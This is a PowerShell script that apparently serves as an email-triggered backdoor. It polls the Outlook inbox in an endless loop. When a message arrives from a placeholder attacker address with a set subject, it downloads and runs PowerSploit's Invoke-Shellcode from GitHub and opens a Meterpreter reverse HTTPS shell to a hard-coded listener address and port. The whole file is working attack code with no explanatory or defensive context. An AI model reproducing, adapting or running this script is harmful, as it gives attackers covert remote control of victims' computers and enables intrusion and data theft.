while($true){
$olFolderInbox = 6
$outlook = new-object -com outlook.application;
$ns = $outlook.GetNameSpace("MAPI");
$inbox = $ns.GetDefaultFolder($olFolderInbox)
$inbox.items | foreach { 
if($_.SenderEmailAddress -match "ATTACKER@EMAILADDRESS.COM" -and $_.subject -match "CUSTOMSUBJECT")
{IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.127 -Lport 1111 -Force}}}
